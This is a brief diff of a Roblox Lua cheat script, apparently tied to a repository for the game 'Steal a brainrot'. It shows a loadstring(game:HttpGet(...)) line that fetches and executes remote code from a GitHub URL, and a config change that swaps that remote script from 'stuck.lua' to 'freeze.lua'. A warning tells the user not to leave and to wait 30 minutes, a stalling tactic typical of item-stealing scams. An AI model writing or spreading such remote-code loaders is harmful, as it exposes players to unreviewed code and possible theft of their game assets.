@@ -30,7 +30,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a
 --====================================================================--
 local CONFIG = {
     DELAY_BEFORE_SCRIPT = 8,
-    EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck.lua",
+    EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/freeze.lua",
     WARNING_TEXT = "May cause lag. Don't Leave — wait 30 minutes."
 }
 
